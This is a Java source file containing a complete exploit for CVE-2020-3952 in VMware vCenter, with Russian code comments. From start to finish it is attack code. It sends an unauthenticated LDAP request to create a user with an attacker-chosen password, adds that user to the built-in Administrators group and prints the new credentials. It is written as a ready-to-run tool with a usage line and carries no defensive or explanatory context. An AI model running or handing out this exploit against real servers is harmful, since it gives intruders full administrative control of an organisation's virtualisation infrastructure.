import javax.naming.*;
import javax.naming.directory.*;
import java.util.Hashtable;

public class Exploit {

    public static void main(String[] args) throws Exception {

        if (args.length != 3) {
            System.out.println("usage: Exploit <VCENTER_IP> <NEW_USERNAME> <NEW_PASSWORD>");
            System.exit(1);
        }

        String vcenterIp = args[0];
        String newUsername = args[1];
        String newPassword = args[2];

        String ldapUrl = "ldap://" + vcenterIp;

        String dn = "cn=" + newUsername + ",cn=Users,dc=vsphere,dc=local";

        // Установим соединение
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, ldapUrl);

        // Попытка привязки с фейковыми кредами — как в Python коде
        env.put(Context.SECURITY_AUTHENTICATION, "simple");
        env.put(Context.SECURITY_PRINCIPAL, "Administrator@test.local");
        env.put(Context.SECURITY_CREDENTIALS, "fakepassword");

        DirContext ctx = null;
        try {
            ctx = new InitialDirContext(env);
            System.out.println("did not receive ldap.INVALID_CREDENTIALS on bind! failing");
            System.exit(1);
        } catch (AuthenticationException e) {
            System.out.println("got expected ldap.INVALID_CREDENTIALS error on bind");
        } catch (Exception e) {
            System.out.println("failed to bind with unexpected error");
            throw e;
        }

        // Попытка создать пользователя
        try {
            Attributes attrs = new BasicAttributes(true);

            Attribute oc = new BasicAttribute("objectClass");
            oc.add("top");
            oc.add("person");
            oc.add("organizationalPerson");
            oc.add("user");

            attrs.put(oc);
            attrs.put("cn", newUsername);
            attrs.put("sn", "vsphere.local");
            attrs.put("uid", newUsername);
            attrs.put("sAMAccountName", newUsername);
            attrs.put("userPrincipalName", newUsername + "@VSPHERE.LOCAL");
            attrs.put("givenName", newUsername);
            attrs.put("vmwPasswordNeverExpires", "True");
            attrs.put("userPassword", newPassword);

            ctx = new InitialDirContext(env);
            ctx.createSubcontext(dn, attrs);
        } catch (NameAlreadyBoundException e) {
            System.out.println("user already exists, skipping add and granting administrator permissions");
        } catch (Exception e) {
            System.out.println("failed to add user. this vCenter may not be vulnerable to CVE-2020-3952");
            throw e;
        }

        System.out.println("user added successfully, attempting to give it administrator permissions");

        // Добавим в группу админов
        try {
            ModificationItem[] mods = new ModificationItem[1];
            mods[0] = new ModificationItem(DirContext.ADD_ATTRIBUTE,
                    new BasicAttribute("member", dn));

            ctx.modifyAttributes("cn=Administrators,cn=Builtin,dc=vsphere,dc=local", mods);
        } catch (AttributeInUseException e) {
            System.out.println("user already had administrator permissions");
        } catch (Exception e) {
            System.out.println("user was added but failed to give it administrator permissions");
            throw e;
        }

        System.out.println("success! you can now connect to vSphere with your credentials.");
        System.out.println("username: " + newUsername);
        System.out.println("password: " + newPassword);
    }
}
